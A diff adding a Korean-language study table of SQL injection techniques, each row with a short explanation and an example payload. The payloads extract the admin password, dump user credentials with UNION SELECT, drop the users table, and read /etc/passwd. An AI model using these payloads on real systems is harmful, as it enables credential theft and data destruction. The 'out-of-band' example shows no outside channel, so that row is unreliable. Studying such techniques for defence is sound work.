@@ -1,0 +1,10 @@
+### SQL injection의 경우 상황에 따라 이용해야 하는 방법이 다르며, 아래는 어떤 상황에서 이용 해야하는지 표를 확인하자
+
+| 공격 기법 | 특징 | 설명 및 예제 |
+| --- | --- | --- |
+| **Boolean-Based Blind SQL Injection** | True/False 기반 | 응답 페이지의 변화를 분석하여 정보를 추출하는 기법. 주로 `AND` / `OR` 조건을 활용함.✅ **예제:** `1' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 22 --` |
+| **Time-Based Blind SQL Injection** | 응답 지연 기반 | `SLEEP()` 함수를 이용해 응답 시간을 조작하여 조건이 참/거짓인지 판단.✅ **예제:** `1' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin') = 22, SLEEP(5), 0) --` |
+| **Error-Based SQL Injection** | 에러 메시지 이용 | 데이터베이스에서 발생하는 에러 메시지를 이용해 내부 정보를 추출.✅ **예제:** `1' AND (SELECT 1/0 FROM users) --` (0으로 나누기 오류 유발) |
+| **Union-Based SQL Injection** | 결과 조작 | `UNION SELECT`를 사용해 공격자가 원하는 데이터를 페이지에 출력.✅ **예제:** `1' UNION SELECT username, password FROM users --` |
+| **Stacked Queries (다중 쿼리)** | 여러 SQL 문 실행 | `;`(세미콜론)을 이용해 여러 개의 SQL 문장을 실행.✅ **예제:** `1'; DROP TABLE users; --` (데이터베이스 테이블 삭제 가능) |
+| **Out-of-Band SQL Injection** | 외부 채널 활용 | DNS 요청, HTTP 요청 등을 통해 데이터를 외부 서버로 전송.✅ **예제:** `1' UNION SELECT LOAD_FILE('/etc/passwd') --` |
